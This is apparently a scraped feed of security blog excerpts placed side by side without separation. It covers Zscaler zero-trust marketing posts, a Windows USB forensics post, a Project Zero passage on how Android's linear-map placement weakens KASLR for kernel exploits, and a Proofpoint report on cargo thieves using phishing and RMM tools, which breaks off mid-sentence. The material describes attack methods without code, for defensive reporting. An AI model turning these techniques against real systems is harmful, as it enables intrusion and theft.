      "summary": "Introduction: Why This Book Matters for Higher EducationHigher education has always been a space for innovation, collaboration, and intellectual progress\u2014but as institutions increasingly rely on digital tools to enable their work, they face a growing number of complex cybersecurity challenges. From hybrid learning models and cloud migration to smart campus systems, the ways universities interact with data, users, and technology have fundamentally changed. Unfortunately, legacy IT systems haven\u2019t kept pace with these advancements.As campuses struggle with cyber threats, outdated architectures, and fragmented IT systems, the need for a comprehensive approach to security has never been clearer. Colleges and universities across the globe must look for new frameworks to safeguard sensitive data, scale efficiently, and enable collaboration. That\u2019s why we, along with a team of Zscaler experts, helped author The Zero Trust Campus.To further set the tone for this critical conversation, we are fortunate to have a powerful foreword written by Mark Silis, Former VP for Information Technology & Services at Massachusetts Institute of Technology (MIT). With decades of experience driving advancements at one of the world's leading institutions, Mark shares his insights on how innovation and cultural alignment are critical to addressing today\u2019s security and operational challenges in higher education.This book is both a roadmap and a resource for higher education IT leaders who are navigating today\u2019s digital challenges. Whether you\u2019re working to protect student data, support global research collaborations, or comply with evolving regulations, Zero Trust Architecture is the future of securing campuses. Today, we're excited to announce that The Zero Trust Campus is live for download.What You\u2019ll Learn from This BookThe Zero Trust Campus isn\u2019t just about responding to the cybersecurity challenges we face today\u2014it\u2019s about preparing institutions for tomorrow. We wrote this book to provide actionable solutions, practical frameworks, and insights for leaders looking to modernize their IT infrastructures. Here are a few key areas we explore:Cyber Threats: Why Higher Education Is a Prime TargetUniversities are facing more advanced and targeted cyber threats than ever before. Ransomware attacks, phishing schemes, and data breaches have become a daily reality for institutions housing sensitive academic records, financial data, and proprietary research findings. According to IBM\u2019s 2025 Cost of a Data Breach Report, the average cost of a breach in higher education stands at $3.8 million\u2014a figure that escalates when factoring in reputational damage and loss of enrollment.Additionally, findings from Zscaler\u2019s ThreatLabz 2025 Ransomware Report underline just how vulnerable the education sector has become: The education sector experienced a 25.8% year-over-year increase with 273 victims listed on data leak sites between April 2024-April 2025. It remains a top 10 target and a focal point for ransomware groups, with student records and research environments being prime targets. These attacks often exploit outdated infrastructures, creating cascading risks across campus systems.In the book, we explain how Zero Trust minimizes vulnerabilities like lateral movement, phishing risks, and endpoint exposure. Zero Trust ensures that no user, device, or application can access campus systems without granular verification, effectively shutting off the attack vectors cybercriminals exploit on traditional networks.(Sources:&nbsp;IBM's 2025 Cost of a Data Breach Report;&nbsp;Zscaler ThreatLabz 2025 Ransomware Report)Modernizing IT InfrastructureMany universities operate on legacy IT systems built around hub-and-spoke network architectures, traditional perimeter defenses, and outdated VPNs. These environments might have worked 20 years ago when users and applications were confined to campus systems\u2014but today\u2019s landscape is distributed, mobile, and reliant on cloud-hosted technologies. Zero Trust addresses the limitations of these legacy systems by focusing not on securing perimeter-based networks, but the users and devices accessing critical applications.With Zero Trust, institutions can replace fragmented, static infrastructures with scalable solutions that empower hybrid classrooms, secure IoT-enabled devices, and enable collaboration across global research teams\u2014all while reducing complexity and improving cost efficiency.Fostering Collaboration and InnovationHigher education thrives on connectivity and collaboration\u2014whether it\u2019s professors sharing research findings across borders or students attending online courses from anywhere in the world. Unfortunately, traditional network architectures are not designed to facilitate this scale of seamless, secure interaction. Zero Trust enables universities to build an IT environment that prioritizes flexibility, scalability, and high performance without compromising on security.The book explores how universities can adopt Zero Trust to enable instant, secure access to SaaS platforms, research databases, and learning management systems\u2014wherever users may be. By eliminating bottlenecks and ensuring sensitive systems remain protected, Zero Trust helps higher education institutions fulfill their mission of enabling innovation.Why Zero Trust Is the FutureAs the former Chief Information Security Officer for the State of Illinois, I\u2019ve seen firsthand how traditional approaches to security leave organizations vulnerable to modern cyber threats. Universities face even greater challenges than most industries because their environments demand a balance between openness, collaboration, and privacy. The principles of Zero Trust are perfectly suited to this reality.Zero Trust assumes no user, device, or application can be trusted by default\u2014even if they appear to be \u201cwithin the network.\u201d This framework operates on fundamental pillars:Least privilege access, ensuring users only access systems and data relevant to their role.Continuous identity verification, applying granular authentication for every access request.Context-aware policies, allowing institutions to incorporate device type, location, and user activity into their access management framework.With these principles in place, Zero Trust ensures sensitive academic data is protected from unauthorized access and internal or external threats. What\u2019s more, Zero Trust doesn\u2019t disrupt collaboration or institutional culture\u2014it supports it by enabling secure, seamless access tailored to higher education\u2019s unique needs.Institutions that begin adopting Zero Trust today will be better positioned to scale, innovate, and respond to evolving cyber risks in the years ahead.Get Your Copy of The Zero Trust CampusWhether you\u2019re a CIO, CTO, or campus IT leader, The Zero Trust Campus provides the tools, insights, and frameworks you need to modernize IT, protect your institution, and position your campus for success.

      "link": "https://www.zscaler.com/blogs/product-insights/how-zscaler-zero-trust-exchange-saves-money-customers",
      "summary": "Organizations today are faced with a stark economic reality. From inflation and tariffs to increasingly intense competition among businesses, there are countless factors challenging everyone to do more with less. In the midst of all these pressures, cybersecurity is one area where there cannot be any compromises, where quality cannot be sacrificed in the name of cost. That\u2019s because a single breach can be disastrous. Despite this, even security teams are not exempt from the demand to reduce spending. So, what are they to do?The Zscaler Zero Trust Exchange provides a zero trust architecture that systematically minimizes the risk of cyber breaches (you can learn how it does so&nbsp;here). Uniquely, as the platform improves organizations\u2019 security postures, it simultaneously saves them money.&nbsp;ESG (Enterprise Strategy Group) recently published an&nbsp;Economic Validation Report that explores how the Zero Trust Exchange cuts costs for customers. In particular, the report looks at six key categories of savings available with Zscaler, and offers quantitative examples of the financial benefits that customers typically receive. Throughout the rest of this blog post, we will provide a high-level overview of these six pillars of economic value.&nbsp;1. Optimized technology costsZscaler delivers a&nbsp;zero trust architecture that eliminates&nbsp;network-centric architectures and&nbsp;the costly tools that constitute them, including&nbsp;firewalls and VPNs. It connects entities directly to apps without routing traffic through the corporate network, which helps organizations minimize private networking costs. Additionally, the Zero Trust Exchange is a comprehensive platform that secures any-to-any communications and provides a wealth of functionality, enabling it to take the place of dozens of point solutions like&nbsp;secure web gateway,&nbsp;data loss prevention,&nbsp;sandboxing, and more. Because Zscaler is delivered as a scalable service from the cloud, it also allows organizations to avoid extensive capacity planning and overprovisioning, and eliminates the rigid CapEx of hardware with a flexible OpEx model.&nbsp;2. Reduced operational complexityTraditional architectures require numerous security and networking appliances that need ongoing change implementation, creating a management burden for admins. Zero trust, on the other hand, is delivered as a fully managed service from a cloud native platform, with Zscaler implementing patches, updates, and more on the customer\u2019s behalf. Additionally, as mentioned above, Zscaler consolidates a wide variety of functionality into a single platform that can protect data and stop threats throughout the IT ecosystem\u2014eliminating the need to manually duplicate policies across disjointed point products. All of this translates to operational simplicity, time savings for admins that let them focus on value-added projects instead of menial tasks, and, as a result, a&nbsp;reduction in management overhead.3. Increased business agilityTo capitalize on business opportunities, organizations in today\u2019s fast-paced world must be able to expand or modify their operations quickly and securely. But network-centric architectures hinder their ability to do so. Built on rigid appliances, these architectures lack the flexibility to scale operations dynamically and safely, making tasks like adding business units or branches complex, time-consuming, and risky. Fortunately, the Zero Trust Exchange is a scalable, secure platform that enables organizations to spin up new users, apps, clouds, and locations both seamlessly and safely. Additionally, during&nbsp;mergers and acquisitions (M&amp;A), direct-to-app access with Zscaler empowers customers to forgo network integrations entirely, eliminating complexity, scope creep, and cost while accelerating M&amp;A time-to-value.&nbsp;4. Improved security postureCyber breaches can waste money for organizations through IT downtime, remediation costs, legal fees, compliance penalties, customer churn, brand damage, and more. Fortunately, the Zero Trust Exchange&nbsp;reduces the risk of breaches (and their costs) in four key ways. First, it minimizes the attack surface by eliminating firewalls, VPNs, and their public IP addresses, which can be found by criminals on the web. Second, it stops compromise as a scalable cloud platform that can inspect all traffic, even encrypted traffic at scale, and block threats therein. Third, it prevents lateral threat movement by connecting entities directly to apps instead of the network. Fourth, it stops data loss across all potential leakage paths, including TLS/SSL traffic, SaaS apps, email, and endpoints.&nbsp;5. Enhanced user productivityTraffic is typically backhauled to a centralized data center for security and connectivity (even for remote users accessing cloud apps), but this adds latency that slows users down. The Zero Trust Exchange delivers secure, direct-to-app connectivity from a global cloud and at the edge\u2014it even&nbsp;accelerates user experiences by routing traffic via the optimal path to its destination. And with&nbsp;Zscaler Digital Experience (ZDX), it can provide full visibility across the entire user connection as well as AI-powered root cause analysis that intelligently pinpoints the causes of performance issues. This is a departure from siloed monitoring tools that foster blind spots, require manual correlation of data, and slow troubleshooting. Overall, Zscaler saves time for end users, NetOps, and service desk teams, and&nbsp;maximizes productivity.&nbsp;6. Other business considerationsIn addition to the above, Zscaler helps organizations save money in other key ways. First, it eliminates the power-hungry appliances of network-centric architectures through a multitenant cloud platform that runs on 100% renewable energy. This decreases organizations\u2019 electricity requirements,&nbsp;carbon footprints, and power bills. Next, with full visibility into&nbsp;shadow IT (and&nbsp;shadow AI), Zscaler allows organizations to uncover the tools employees use, identify redundancies, and optimize their spending on applications. Finally, organizations that deploy zero trust architecture with Zscaler tend to receive&nbsp;lower cyber insurance premiums. That\u2019s because insurance providers recognize that zero trust makes breaches much less likely, decreasing the odds that they will have to pay out to their customers.&nbsp;ConclusionIn times of economic uncertainty, organizations must cut costs wherever and however they can\u2014and even cybersecurity is not spared from the mandate. Fortunately, with Zscaler, security teams can do their part in saving money while simultaneously reducing cyber risk.&nbsp;To see more about the savings Zscaler offers (including real-world numbers achieved by average customers), read the&nbsp;ESG Economic Validation Report.Or, to learn more about the security benefits of zero trust, sign up for our introductory webinar,&nbsp;Zero Trust 101: Start Your Journey Here.",

      "summary": "Back in the days, it used to be easy to spot the enemy. They were outside the firewall, probing the ports, dropping malware like breadcrumbs.&nbsp;Fast forward to 2025, and attackers don\u2019t break in anymore. They sign in.Imagine waking up to an alert about an \u201cimpossible login.\u201d Same user, two continents, two minutes apart. You tell yourself it\u2019s a glitch. It\u2019s not. Someone just logged in as one of you. No exploit, no zero-day, no breach of the perimeter.&nbsp;Just a valid credential\u2014and a quiet kind of violence.The perimeter didn\u2019t move to the cloud, it melted into browsers, identities, and devices that you don\u2019t own and can\u2019t fully see. The employee\u2019s laptop is now the trench line, their credentials the currency of war.The Battlefield is Shifting from Servers to UsersEvery company I talk to feels this tectonic shift.&nbsp;The average enterprise now runs around a hundred SaaS apps,&nbsp;according to Okta, and most have no idea who still has access to half of them.&nbsp;The same convenience that lets your sales team close deals from a beach bar also lets attackers live off the land, phoning the helpdesk and resetting passwords with a polite lie.AI, naturally, has joined the fight. Deepfakes don\u2019t need to be perfect anymore\u2014just convincing enough to fool a tired analyst or a sleepy IT admin. The rise of generative AI has supercharged phishing into something colder and smarter. Personalized pretexts. Voice clones that sound like your CFO asking for \u201ca small transfer.\u201dAnd it\u2019s working. I recall a CISO confiding after an insider incident:&nbsp;\u201cWe hardened every server, patched every endpoint. Then someone called our helpdesk pretending to be me, and got a reset link in thirty seconds.\u201dThat\u2019s where the battleground now, yet many enterprises still defend like it\u2019s 2015.Consequences & Evidence: The Erosion of User TrustThe past year offered a series of wake-up calls.When&nbsp;thousands of Grok AI chats became publicly searchable on Google, users learned that even \u201cprivate\u201d interactions with AI assistants could be exposed through shared URLs. Such lapses highlight how porous digital identities have become, and how much personal data sits just one misconfiguration away from the open web.At the same time, the&nbsp;UK\u2019s decision to drop its backdoor-encryption demand from Apple underscored how political pressure is colliding with user-centric privacy.&nbsp;Also, not very long ago,&nbsp;the Okta breach in 2023 showcased how one compromised endpoint rippled through the supply chain. Attackers accessed session tokens from support laptops, then quietly impersonated legitimate users across hundreds of downstream companies.&nbsp;Even security awareness training has started to buckle. Deepfake voices, cloned writing styles, and AI-generated phishing kits now blur the line between simulation and reality. Each new campaign trains users to spot threats that no longer look like threats.You can\u2019t out-train a threat that studies you closer than you study it.Also, let\u2019s be honest about the shortcomings we pretend aren\u2019t there.Most companies are still drowning in password sprawl and MFA fatigue. VPN-centric architectures flatten networks into one massive attack surface. SaaS offboarding? Often an afterthought where tokens and shadow accounts hang around like forgotten keys under the corporate doormat.Phishing kits now automate MFA fatigue attacks; infostealers harvest tokens that bypass identity checks altogether.&nbsp; Patch debt builds up at the edge. Configurations drift. Alerts stack up faster than analysts can clear them. Security hygiene has become a to-do list no one has time to do.The result is that user identity, once a simple login, has become a volatile signal that fluctuates by context, behaviour, and risk. The shift is architectural: from static trust models to adaptive, identity-centric security. Each session, each request, each click becomes a mini-risk assessment.Practical Prescriptions: Building a User-Centric DefenseReal defense starts at the user. Every access request, every session, every browser tab becomes a test of trust\u2014continuously verified, never assumed.The smartest teams I know are moving to phishing-resistant MFA that combine passkeys, biometrics, and WebAuthn. They\u2019re enforcing device posture at the session level, not once at login. They\u2019re killing VPNs in favor of app-level access, letting users into the&nbsp;one thing they need and nothing else.SaaS sprawl is getting reined in, too. Centralized SSO, least-privilege policies, automated offboarding, and quarterly entitlement reviews. Governance isn\u2019t a checkbox, it\u2019s a heartbeat.Protecting the user now requires a fabric, not a fence. One that can decrypt, inspect, and enforce in real time, no matter where the connection originates. That\u2019s what Zscaler&nbsp;Zero Trust for Users delivers: identity-aware security that travels with every session, enforcing policy inline without ever backhauling traffic or trusting the network.Within that fabric,&nbsp;Zscaler Internet Access (ZIA) inspects and secures all internet and SaaS traffic inline, decrypting 100% of SSL/TLS sessions and stopping threats across all ports and protocols through AI-driven correlation, DLP, CASB, and sandboxing, without latency trade-offs.&nbsp;Zscaler Private Access (ZPA) provides identity-based, outbound-only access to private applications, eliminating VPNs and lateral movement.&nbsp;Zscaler Digital Experience (ZDX) ensures security doesn\u2019t come at the cost of performance, using continuous telemetry and synthetic monitoring to ensure services remain optimal and users aren\u2019t tempted to look for ways to bypass their security controls.To extend control where browsers and credentials meet, the&nbsp;Zero Trust Browser isolates sessions entirely, obscuring backend systems, blocking copy/paste and downloads, and redacting sensitive fields right on the screen.&nbsp;For administrators and vendors,&nbsp;Privileged Remote Access (PRA) delivers agentless, just-in-time connectivity through isolated SSH, RDP, and VNC sessions\u2014recorded, command-controlled, and never exposing the corporate network.&nbsp;Meanwhile, the&nbsp;Zero Trust Firewall and&nbsp;Cloud Sandbox inspect all ports and file types inline, detonating unknown payloads and neutralizing zero-days before execution.&nbsp;And surrounding it all,&nbsp;Risk360 quantifies exposure by correlating user, device, and threat telemetry, and feeding that intelligence into the Zero Trust Exchange so enforcement adapts dynamically to live risk posture.&nbsp;Together, these capabilities form a single cloud-native enforcement fabric that consolidates legacy tools such as VPNs, firewalls, proxies, and DLP appliances, into a unified Zero Trust platform. The result: stronger security, measurable cost reduction, and better user experience.The Perimeter Is YouEvery CISO I know is exhausted. They\u2019re fighting on a front that\u2019s invisible and internal\u2014part human, part algorithm. But that\u2019s what makes it noble work.The future of cybersecurity won\u2019t be defined by bigger walls. It\u2019ll be defined by smaller circles of trust, drawn tightly around the people and identities that make a business real. When security moves with the user, performance follows, risk drops, and simplicity returns.Because when the smoke clears, the only perimeter left is&nbsp;you.Want to get started?&nbsp;Speak to one of our experts for a free consultation.",

      "link": "https://www.zscaler.com/blogs/zscaler-life/31-years-service-new-mission-cybersecurity-angel-s-journey-zscaler",
      "summary": "For 31 years, Angel Rivera dedicated his life to serving his country in the U.S. Army, starting in combat arms and eventually transitioning to information technology. After a long and distinguished career, the next mission was a personal one: transitioning to the civilian world. Today, Angel is a Senior Sales Engineer on Zscaler\u2019s Public Sector team, and his path here is a powerful testament to the community, growth, and culture that make a new chapter possible.We sat down with Angel to hear his story\u2014a journey of finding camaraderie in a new team and discovering that the right company culture can make all the difference.Finding a Familiar Fit in a New WorldFor many transitioning service members, the corporate world can feel like a foreign landscape. But for Angel, Zscaler was already on his radar. \"I have known about Zscaler for years, even working with the technology briefly while in uniform,\" he shares. The decision was made easier by a network of Army friends who had already joined the team, but his official entry point came through a Hiring Our Heroes (HOH) fellowship, which allowed him to start as an intern.This structured pathway provided a crucial bridge from military service to a corporate role, giving him a chance to learn the ropes before taking on a full-time position.Transitioning to Civilian LifeThe transition from military to civilian life involves more than just a career change; it\u2019s a fundamental shift in daily structure, customs, and even dress code. Angel is candid about the adjustment.\u201cThe team here at Zscaler has been very welcoming, making my transition feel pretty seamless,\u201d he says. \u201cBut it has been a big shift. I wore a uniform so long that things that are relatively normal for civilians can be a challenge. The team even entertains my silly questions about what the 'uniform' is to meet customers.\u201dThis small detail speaks volumes, highlighting the importance of supportive colleagues that provide guidance and resources for success without judgment. \u201cYou do have to pay attention and be deliberate about integrating,\u201d Angel advises. \u201cZscaler has made this experience great.\u201dGrowth Anchored by Community: The Power of Vets@ZAngel\u2019s career growth at Zscaler began when he joined the engineering team where he was exposed to the forefront of innovation. \u201cIt opened my eyes to the talent that exists in this space,\u201d he explains. \u201cI am learning the Zscaler platform extensively. This is the future of cybersecurity.\u201dBut the most impactful part of his growth wasn't just technical; it was human. This supportive network is anchored by Vets@Zscaler, our Employee Resource Group (ERG) dedicated to supporting and empowering our veteran community. For Angel, this group wasn't just a resource; it was a cornerstone of his transition, providing mentorship and a built-in community from day one.He was encouraged to set up meetings across the organization to learn what others did. \u201cI set up over 100 meetings, and without hesitation, they all provided me with guidance,\u201d he recalls. It\u2019s this formal commitment to connection, championed by groups like Vets@Z, that led Angel to his most powerful realization: \u201cI believe in the technology, but the team is what makes this organization great.\u201dAngel\u2019s Advice to Transitioning Service MembersWhen asked what advice he would give to other veterans considering a career in tech, Angel\u2019s response is enthusiastic and clear.\u201cJoin the team!\u201d he says. \u201cIf you\u2019re looking for a great team and want to be on the cutting edge of cybersecurity, this is the place to be. Don\u2019t be afraid to ask questions\u2014everyone on this team has been so accommodating.\u201dHis final message is one of service, extending a hand to those who will follow in his footsteps.\u201cIf you don\u2019t know where to start, reach out to me anytime. I am always here for a veteran.\u201d",

Over the years, it's been pretty amazing to see not only the artifacts expand and evolve, but to also see folks pick up the baton and carry on with describing what amounts to a \"playbook\" for developing this information as part of an investigation. Not only did malware such as <a href=\"https://www.checkpoint.com/cyber-hub/threat-prevention/what-is-malware/raspberry-robin-malware/\">Raspberry Robin</a>&nbsp;propagate via USB devices, but with the rise of other devices that could be attached via a USB connection, but use different protocols, it became more important to operationalize this analysis in a playbook.&nbsp;</div><div><br /></div><div>After all, why not take the inefficient, error-prone, purely manual aspects out of the parsing by automating it?</div><div><br /></div><div><a href=\"https://www.linkedin.com/in/morad-rawashdeh/\">Morad R.</a>&nbsp;put together a series of posts that outline different data/artifact sources you can examine to identify USB devices that had been connected to the endpoint, as well as attribute the use of the devices to a particular user. This series of posts illustrates some steps that begin the process of pulling back the veil, if you will, to unraveling the use of USB devices on Windows systems. While there is definitely more to be done and shared, the important common factor across the posts is the use of timelines.&nbsp;</div><div><br /></div><div><a href=\"https://www.linkedin.com/feed/update/urn:li:activity:7385564679512961024/\">USB Forensics, pt 1: Unmasking the connected device</a> - Focuses on the System Registry hive, and extracting time stamps from Properties key values. The focus on a timeline is great way to get started on this, as doing so takes the analyst directly to context.&nbsp;</div><div><br /></div><div>However, by focusing on just USB and USBStor keys in the System hive, <a href=\"https://windowsir.blogspot.com/2022/03/the-misuse-of-artifact-categories-pt-ii.html\">other devices</a> (smartphones, digital cameras) are missed. However, that's not really an issue, per se, as the same playbook can be applied to the appropriate Registry keys.</div><div><br /></div><div><a href=\"https://www.linkedin.com/feed/update/urn:li:activity:7388103261481750528/\">USB Forensics, pt 2: Mapping device to user &amp; drive letter</a> - focuses on the user's NTUSER.DAT, but doesn't mention other artifacts, such as shellbags, RecentDocs, UserAssist, etc., that could be used to correlate additional user activity with the device, particularly via a timeline.&nbsp;</div><div><br /></div><div><a href=\"https://github.com/keydet89/RegRipper4.0\">RegRipper</a> still makes use of \"<a href=\"https://windowsir.blogspot.com/2011/09/stuffand-whatnot.html\">profiles</a>\", which is the term I used to describe what became known as \"playbooks\". Or, another way to look at it is that you can implement playbooks through these profiles.</div><div><br /></div><div><a href=\"https://www.linkedin.com/posts/morad-rawashdeh_usbforensics-dfir-eventloganalysis-ugcPost-7390644720336654336-gw_L/\">USB Forensics, pt 3: The Event Log timeline</a>&nbsp;- focus on a timeline continues, which is good. However, the logs are technically referred to as \"Windows Event Logs\"; \"Event Logs\" refer to the Windows 2000, XP, and 2003 era logs. I understand, I 'get it', that this is a distinction without a difference for most analysts, particularly those who've never had to work with Event Log records from older systems, and are only familiar with the new format implemented as of Windows Vista.&nbsp;</div><div><br />All three of these posts, together, serve as a good foundation, and a great first step toward addressing USB-connected devices on Windows endpoints. Just as the field has grown and expanded since 2005, it will continue to do so in the future. In addition to providing the data sources, the underlying reliance on (or at least pointing in the direction of) timelines is, I believe, foundational. <i>Start with</i> a timeline, do not let a timeline be something you assemble manually, after everything else is done. We can always add or remove data sources, create new RegRipper or Events Ripper plugins, etc., but creating a timeline should be \"first principles\".&nbsp;<br /><br /></div><div>In my current role, I don't have a need to determine things such as USB devices connected to a Windows system, but if I did, I'd definitely have <a href=\"https://github.com/keydet89/Events-Ripper\">Events Ripper</a> plugins to extract that information, maybe even correlate it, into an easy-to-view manner.&nbsp;</div><div><br /></div><div>This is just some of the content from my blog that explicitly addresses USB devices:</div><div><a href=\"https://windowsir.blogspot.com/2006/09/something-old-something-newwith-usb.html\">Something old, something new...with USB</a> - 2006-09-26</div><div><a href=\"https://windowsir.blogspot.com/2007/04/from-lab-mapping-usb-devices-via-lnk.html\">From the Lab: Mapping USB devices via LNK files</a> - 2007-04-09</div><div><a href=\"https://windowsir.blogspot.com/2022/03/the-misuse-of-artifact-categories-pt-ii.html\">HowTo: USB Thumb Drives</a>&nbsp;- 2012-02-04</div><div><a href=\"https://windowsir.blogspot.com/2013/07/howto-correlate-attached-device-to-user.html\">HowTo: Correlate an Attached Device to a User</a> - 2013-07-01</div><div><a href=\"https://windowsir.blogspot.com/2022/05/usb-device-redux-with-timelines.html\">USB device redux, with timelines</a> - 2022-05-26</div>",

This feature is enabled on Android due to its usage in VM memory sharing. When new memory is plugged into an already running system, it must be possible for the Linux kernel to address this new memory, including adding it onto the linear map. Android on arm64 uses a page size of 4 KiB and 3-level paging, which means virtual addresses in the kernel are limited to 39 bits, unlike typical X86-64 desktops which use 4-level paging and have 48 bits of virtual address space (for kernel and userspace combined); the linear map has to fit within this space further shrinking the area available for it. Given that the maximum amount of </span><span face=\"Arial, sans-serif\" style=\"font-size: 11pt; font-weight: 700; vertical-align: baseline;\">theoretical</span><span face=\"Arial, sans-serif\" style=\"font-size: 11pt; vertical-align: baseline;\"> physical memory is far larger than the entire </span><span face=\"Arial, sans-serif\" style=\"font-size: 11pt; font-weight: 700; vertical-align: baseline;\">possible</span><span face=\"Arial, sans-serif\" style=\"font-size: 11pt; vertical-align: baseline;\"> linear map region range, the kernel places the linear map at the lowest possible virtual address so it can theoretically be prepared to handle exorbitant (up to 256GB) quantities of hypothetical future hot-plugged physical memory.

The brighter the green of a pixel, the more often that page was attacker controlled, with a white pixel representing a pfn that was allocated every time. A black pixel represents a pfn that was never allocated - often because those pfn numbers are not mapped to physical memory or because they are used every time in a deterministic way.

The joint effect of these two issues dramatically simplified what might otherwise have been a more complicated and likely less reliable exploit. While side-channel attacks do impact the long-term viability of KASLR on all architectures, it is notable that Project Zero and the Google Threat Intelligence Group have yet to see a hardware side-channel attack for bypassing KASLR on Android in the wild. Additionally, KASLR still plays an important role in mitigating any remote kernel exploitation attempts. It is valuable from a security in-depth perspective to recognize the impact KASLR has on exploit complexity and reliability in real-world scenarios.

      "link": "https://www.proofpoint.com/us/blog/threat-insight/remote-access-real-cargo-cybercriminals-targeting-trucking-and-logistics",
      "summary": "Key findings&nbsp;\n\n\n\tCybercriminals are compromising trucking and freight companies in elaborate attack chains to steal cargo freight.&nbsp;\n\tCargo theft is a multi-million-dollar criminal enterprise, and digital transformation has led to an increase in cyber-enabled theft.&nbsp;&nbsp;&nbsp;\n\tThreat actors compromise these companies and use their access to bid on cargo shipments, to then steal and sell them.&nbsp;\n\tThe threat actors typically deliver remote monitoring and management (RMM) tools, aligning with the broader trend of cybercriminals adopting these as a first-stage payload across the threat landscape.&nbsp;\n\n\nOverview&nbsp;\n\nProofpoint is tracking a cluster of cybercriminal activity that targets trucking and logistics companies and infects them with RMM tooling for financial gain. Based on our ongoing investigations paired with open-source information, Proofpoint assesses with high confidence that the threat actors are working with organized crime groups to compromise entities in the surface transportation industry \u2014 in particular trucking carriers and freight brokers \u2014 to hijack cargo freight, leading to the theft of physical goods. The stolen cargo most likely is sold online or shipped overseas. Such crimes can create massive disruptions to supply chains and cost companies millions, with criminals stealing everything from energy drinks to electronics.&nbsp;&nbsp;\n\nIn the observed campaigns, threat actors aim to infiltrate companies and use their fraudulent access to bid on real shipments of goods to ultimately steal them. The observed campaigns described in this report are similar to activity Proofpoint researchers previously detailed in September 2024. However, we cannot assess with high confidence whether historic and current campaigns are conducted by the same or multiple groups; thus, Proofpoint is not attributing the activity to a tracked threat actor.&nbsp;&nbsp;\n\nOld crimes, new tools: the digital transformation of cargo theft&nbsp;&nbsp;\n\nAccording to the National Insurance Crime Bureau, cargo theft leads to $34 billion in losses annually. Cargo theft can refer to many different types of activities leading to the theft of commercial shipments while cargo is in transit. Much of this activity is conducted by organized criminal groups, according to U.S. law enforcement, and Congress has introduced legislation to combat organized retail theft as it has skyrocketed since the COVID-19 pandemic. (Cargo theft conducted by organized crime has been a problem for decades \u2013 from \u201cOld West Train Robbers\u201d to 1960s mobsters to our modern cyber-enabled heists.) Proofpoint previously published details on a similar type of cybercrime targeting cargo that impersonates various companies to steal medical and electronic equipment.&nbsp;\n\nWhile the campaigns that Proofpoint discusses in this report relate to North American cargo theft, it\u2019s a global problem. According to Munich RE, global cargo theft hotspots include Brazil, Mexico, India, the U.S., Germany, Chile, and South Africa, while the most targeted commodities are food and beverage products.&nbsp;&nbsp;\n\nCyber-enabled theft is one of the most common forms of cargo theft and relies on social engineering and a knowledge of how the trucking and transportation industries work. According to IMC Logistics, opportunities for cyber-enabled theft are partly responsible for the dramatic increase in cargo theft in recent years: \u201c\u2026the digitization of domestic and international supply chains has created new vulnerabilities and thus opportunities for [Organized Theft Groups] to exploit gaps using sophisticated and ever-evolving cyber capabilities. These groups can steal freight remotely by exploiting the technology that has been embedded into supply chains to move cargo more efficiently.\u201d&nbsp;\n\nThe attack chain in the observed campaigns leading to cargo theft attempts, which will be described in subsequent sections, is as follows: the threat actor will compromise a broker load board account (a marketplace companies use to facilitate booking loads for trucks), post a fake load, and kick off the attack chain when a carrier responds. &nbsp;\n\n\n\nFigure 1. Attack flow.&nbsp;\n\nCampaign details&nbsp;\n\nThe threat cluster engaged in suspected cargo theft has been active since at least June 2025, though evidence suggests the group\u2019s campaigns began as early as January. The actor has delivered a range of RMM tools (or in some cases remote access software), including ScreenConnect, SimpleHelp, PDQ Connect, Fleetdeck, N-able and LogMeIn Resolve. These RMMs/RAS are often used in tandem; for example, PDQ Connect has been observed downloading and installing both ScreenConnect and SimpleHelp. Once initial access is established, the threat actor conducts system and network reconnaissance and deploys credential harvesting tools such as WebBrowserPassView. This activity indicates a broader effort to compromise accounts and deepen access within targeted environments.&nbsp;&nbsp;\n\nResearchers have identified related network infrastructure and similar tactics, techniques, and procedures (TTPs) in campaigns delivering NetSupport and ScreenConnect going back to January 2025, suggesting a longer operational timeline. Separately, from 2024 through March 2025, Proofpoint also tracked a threat actor targeting ground transportation organizations distributing DanaBot, NetSupport, Lumma Stealer, and StealC, which we previously reported on. It is possible these clusters of activity are all related; however, we cannot attribute this with high confidence. All appear to have knowledge about the software, services, and policies around how the cargo supply chain operates. Regardless of the ultimate payload, stealers and RMMs serve the same purpose: remotely access the target to steal information. However, using RMM tools can enable threat actors to fly further under the radar. Threat actors can create and distribute attacker-owned remote monitoring tools, and because they are often used as legitimate pieces of software, end users might be less suspicious of installing RMMs than other remote access trojans. Additionally, such tooling may evade anti-virus or network detections because the installers are often signed, legitimate payloads distributed maliciously. Cargo theft actors using RMMs aligns with an overall shift in the cybercrime landscape where threat actors increasingly are adopting RMMs as a first stage payload.&nbsp;&nbsp;\n\nIn just the last two months, Proofpoint has observed nearly two dozen campaigns, with volumes ranging from less than 10 to over 1,000 messages per campaign.&nbsp;&nbsp;\n\n\n\nFigure 2. Most frequently observed first-stage payloads targeting surface transportation since August 2025.&nbsp;\n\nThe threat cluster has employed three tactics to deliver RMM tools:&nbsp;&nbsp;\n\n\n\tCompromising load boards. The actor posts fraudulent freight listings using compromised accounts on load boards and then sends emails containing malicious URLs to carriers who inquire about the loads. This tactic exploits the trust and urgency inherent in freight negotiations (see Figure 3).&nbsp;\n\tEmail thread hijacking. Using compromised email accounts, the threat actors inject malicious content and URLs into existing conversations (see Figure 4).&nbsp;\n\tDirect targeting via email campaigns. The cluster has launched direct email campaigns against larger entities, including asset-based carriers, freight brokerage firms, and integrated supply chain providers. Gaining access to these entities may allow the actors to identify high-value freight loads or uncover other opportunities to further their objectives\u2014such as posting fraudulent loads on load boards (see Figure 5).&nbsp;\n\n\n\n\nFigure 3. Email sent to a carrier responding to a fraudulent load posted on a load board.&nbsp;\n\n\n\nFigure 4. Threat actor using a compromised email account and inserting a malicious link into an ongoing conversation.&nbsp;\n\n\n\nFigure 5. Direct email sent to hundreds of organizations in the ground transportation industry.&nbsp;\n\nTypically, emails contain URLs that lead to an executable (.exe) or an MSI (.msi) file.&nbsp; When clicked, these files install an RMM tool, granting the threat actor full control of the compromised machine. In some cases, the threat actor will create domains and landing pages that impersonate legitimate brands or generic transportation terms to further the believability of the social engineering.&nbsp;\n\nBased on campaigns observed by Proofpoint, the threat actor does not appear to attack specific companies, and targets range from small, family-owned businesses to large transport firms as described above. The threat actor appears to be opportunistic about the carriers that it targets and will likely attempt to compromise any carrier who responds to the fake load posting. Once a threat actor has compromised a carrier, they probably will use their knowledge of the industry and any insider information derived from other compromises to identify and bid on loads that are likely to be profitable if stolen.&nbsp;&nbsp;\n\nWhile investigating the objectives of this threat cluster, Proofpoint researchers found multiple public discussions on social media websites that aligned precisely with the phishing and account takeover activity we had observed by this actor. One public Reddit post shared an experience in which the 